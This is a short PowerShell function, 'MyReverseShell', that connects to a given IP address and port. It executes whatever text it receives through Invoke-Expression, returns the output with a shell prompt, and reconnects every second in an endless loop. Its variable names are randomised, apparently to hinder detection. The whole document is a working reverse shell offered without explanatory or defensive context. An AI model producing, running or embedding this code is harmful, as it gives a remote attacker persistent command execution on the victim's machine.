Function MyReverseShell{ Param ($IP, $PORT); while(1) { $WZwFHYUAklT=new-object system.net.sockets.tcpclient("$IP",$PORT);$RAgjhqTxqkY=$WZwFHYUAklT.GetStream();[byte[]]$rOvfftiCPHyHH=0..65535|%{0};while(($VziNCnd=$RAgjhqTxqkY.Read($rOvfftiCPHyHH,0,$rOvfftiCPHyHH.Length)) -ne 0){;$JTsudWp=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($rOvfftiCPHyHH,0,$VziNCnd);$XDttpW=(iex $JTsudWp 2>&1|out-string);$lHhMPyKR=$XDttpW+'PS '+(pwd).Path+'>';$HKUgVNdPCJA=([text.encoding]::ASCII).GetBytes($lHhMPyKR);$RAgjhqTxqkY.Write($HKUgVNdPCJA,0,$HKUgVNdPCJA.Length);$RAgjhqTxqkY.Flush};$WZwFHYUAklT.close(); sleep 1 } }
